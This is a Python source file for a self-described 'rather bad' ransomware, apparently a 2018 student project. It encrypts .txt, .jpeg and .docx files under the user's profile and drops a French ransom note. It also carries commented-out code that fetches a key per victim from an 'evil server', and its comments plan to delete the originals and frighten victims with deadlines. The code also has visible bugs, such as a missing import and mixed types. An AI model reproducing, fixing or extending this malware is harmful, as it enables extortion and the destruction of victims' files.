#
# -*- coding: utf-8 -*-
# installer http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win-amd64-py2.7.exe
import uuid
import requests
import os
from cryptography.fernet import Fernet

# générer aléatoirement un user
user_id = uuid.uuid4().hex.upper()[0:6]

compteur_fichiers_chiffres = 0

def message():
    affichage = '''
#########################################
#                                   	#
#   	Un Ransomware un peu nul    	#
#                                   	#
#  	By FLN - ESD ENI 1 (Nantes)  	#
#                                   	#
#########################################
V1.0 -- 12/2018


'''
    citations = ["\"Toute douleur qui n'aide personne est absurde.\" -- André Malraux",
"\"Toute chose a une fin, sauf le saucisson qui en a deux.\"",
"\"L'absurde et le dérisoire forment parfois l'essentiel.\" -- Elisabeth Carli",
"\"Celui qui veut tromper les hommes doit avant tout rendre l'absurde plausible.\" -- Johann Wolfgang von Goethe",
"\"Il est encore plus absurde de nier ce que l'on entend pas que de le croire.\" -- Mademoiselle de Sommery",
"\"Les cinq symptômes de la paresse :\n1.   \"",
"\"La vitamine C...\nMais elle ne vous dira rien\"",
"\"Je ne parle pas aux cons, ça les instruit.\" -- Michel Audiard",
"\"Aujourd’hui, je suis à deux doigts d’être aimé !\" -- François Hollande",
"\"Mon intelligence est un obstacle\" -- Bruno Le Maire",
"\"Ça va mieux ; même la météo va mieux !\" -- François Hollande",
"\"Je ne suis pas un fraudeur, je suis un contribuable négligent.\" -- Thomas Thévenoud"
]
    affichage += random.choice(citations)
    affichage += '\n'
    affichage += '\n'
    affichage += 'Identifiant de votre clef :'
    affichage += user_id
    affichage += '\n'
    affichage += '\n'
    affichage += 'J\'ai chiffré' + compteur_fichiers_chiffres + ' de tes fichiers\n'
    affichage += 'Désopasdéso <3\n'
    return affichage




# demander une clef pour cet user
__EVIL_SERVER__ = "http://10.101.200.44/index.php"
#clef_en_texte = requests.get(__EVIL_SERVER__ + "&pigeon=" + user_id)
# TEMP:
clef_en_texte = "MugXLTXH3txBnSxmWEHdrxaz7DZOAmvYdbo2sYk3B2c="
# :TEMP
clef = Fernet(clef_en_texte)


# tableau des répertoires chiffrables
user_profile= os.getenv('USERPROFILE')
repertoires = [
    #user_profile + "\\pouet\\",
    user_profile + "\\Desktop\\important\\"
]

# tableau des ext chiffrables
extentions = [
    "*.txt",
    "*.jpeg",
    "*.docx"
]


# OPTIMISATION : Il faudrait splitter cette boucle en deux fonctions :
#   la premiere ferai la liste des fichiers à chiffrer.
#   la seconde accepterai une liste de fichers pour les chiffrer.
#   On pourrait ainsi lancer plusieurs threads ayant chacuns une partie de
#   la liste des fichiers à chiffrer.


for repertoire in repertoires:
    compteur_du_repertoire = 0
    if os.path.exists(repertoire):
        os.chdir(repertoire)
        fichiers = []
        for (dirpath, dirnames, filenames) in os.walk(repertoire):
            fichiers.extend(filenames)
        for fichier in fichiers:
            for extention in extentions:
                if fichier.index(extention):
                    file = open(fichier,'rb')
                    locked = open(fichier + '.lock','xb')
                    locked.write(clef.encrypt(file.read()))
                    file.close()
                    locked.close()
# Quand on saura faire:   os.remove(fichier)
                    compteur_fichiers_chiffres += 1
                    compteur_du_repertoire += 1
    if compteur_du_repertoire > 0:
        information = open(repertoire + 'A_LIRE_EN_URGENCE.txt','x')
        information.write(affichage())
        information.close()


# lire le_fichier
# le chiffrer dans le_fichier.loked
# supprimer le_fichier
#

# catcher toutes les intéruptions pour avoir le temps de supprimer la clef de la mémoire
# à la fin supprimer la clef de la mémoire = random()
#




affichage += 'Nous avons chiffré ' + compteur_fichiers_chiffres + ' fichiers.'
# Générer un message pour l'utilisateur (fond d'écran) contenant l'user
#   les répertoires / le nombre de fichers chiffré
#   les modalités de récupération
#   Faire peur sur une date limite de conservation des clefs
#   Indiquer qu'il y a un compteur d'essay sur les fichiers


